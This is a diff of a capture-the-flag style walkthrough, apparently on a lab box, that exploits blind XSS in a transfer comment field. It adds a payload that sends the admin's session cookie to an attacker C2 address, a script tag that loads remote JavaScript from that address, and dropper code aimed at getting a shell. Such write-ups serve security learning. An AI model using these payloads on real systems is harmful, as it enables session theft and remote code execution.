@@ -196,10 +196,20 @@ Once I submit the transfer I get prompted a JS alert stating that the `admin` wi
 
 ![alert](img/alert.png)
 
-After our examination, we know that the session tokens are static credentials and the transfer is done in javascript from the alert. This is a indication of a possible blind XSS vulnerability where when the `admin` reviews our input, he will execute our malicious script. We might be able to utilize this to execute a .js stored on our own C2 host to drop and execute a payload. So now that we formulated our devious masterplan, lets build the tools we need to perform.
+After our examination, we know that the session tokens are static credentials and the transfers are done in javascript. This is a indication of a possible blind XSS vulnerability where when the `admin` reviews our input, he will execute our malicious script. Which will reflect his session cookies back to our C2. 
+
+We might be able to utilize this to reflect and execute a .js stored on our own C2 host to drop and execute a payload. Which can give us a shell.
+
+
+So now that we formulated our devious masterplan, lets build the tools we need to perform.
 
 ### Weaponization
 Here we build a simple XSS to drop in the comment box in `transfer.php`
+
+XSS Cookie grabber - gets the session token of the admin and reflects it back to us through the url
+```javascript
+<script>var i=new Image;i.src="http://10.10.14.5/?"+document.cookie;</script>
+```
 
 XSS payload
 ```javascript
@@ -210,9 +220,9 @@ XSS payload
 <script src=http://10.10.14.5/pay.js%3E</script>
 ```
 
-On localhost:
 Dropper
-`drop.js`
+
+`payd.js`
 ```javascript
 function paintfunc(){
     var http = new XMLHttpRequest();
@@ -225,8 +235,10 @@ function paintfunc(){
 
 paintfunc();
 ```
+
 Execution
-`exe.js`
+
+`pay.js`
 ```javascript
 function paintfunc(){
     var http = new XMLHttpRequest();
@@ -242,7 +254,6 @@ paintfunc();
 
 
 ### Delivery
-Intruder transmits the malware via a phishing email or another medium
 
 So from my localbox terminal I use a python module called http.server (used to be simpleHTTPserver)
 ```bash
